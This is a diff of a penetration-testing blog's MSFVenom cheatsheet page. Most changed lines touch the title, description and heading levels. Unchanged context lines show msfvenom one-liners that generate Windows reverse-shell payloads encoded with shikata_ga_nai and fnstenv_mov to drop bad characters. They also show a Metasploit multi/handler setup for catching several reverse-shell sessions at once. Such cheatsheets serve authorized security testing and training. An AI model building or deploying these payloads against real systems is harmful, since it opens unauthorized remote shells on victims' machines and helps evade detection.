@@ -1,5 +1,5 @@
 ---
-title: Msfvenom Cheatsheet
+title: "MSFVenom Cheatsheet: Payload Generation & One-Liners Guide"
 date: 2021-04-01T16:11:01+05:30
 lastmod: 2021-04-01T16:11:01+05:30
 author: Animesh Roy
@@ -12,17 +12,16 @@ tags:
   - metasploit
   - tools
 draft: false
-description: "MSFVenom cheat sheet — one-liner payload commands for Windows, Linux, Mac, web shells, and encoded reverse shells."
----
+description: "A complete MSFVenom cheatsheet with one-liner payloads for Windows, Linux, macOS, and web shells. Includes examples for various formats and reverse shells."
 ---
 
-# MSFVenom Cheatsheet
+## MSFVenom Cheatsheet
 Single Page Cheatsheet for common MSF Venom One Liners  
 Available in PDF, DOCX and Markdown format!
 *PDF and DOCX versions contain the payload size in bytes and a few more commands.*
 
 
-# MSFVenom Cheatsheet
+## Quick Reference Table
 
 | MSFVenom Payload Generation One-Liner | Description |
 |-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
@@ -53,7 +52,7 @@ Available in PDF, DOCX and Markdown format!
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |
 
-# Multihandler Listener
+## Multihandler Listener
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
 ```
 msf>use exploit/multi/handler  
@@ -66,5 +65,5 @@ msf>exploit -j
 The -j option is to keep all the connected session in the background.  
 
 
-# references
+## references
 * https://github.com/trustedsec/unicorn
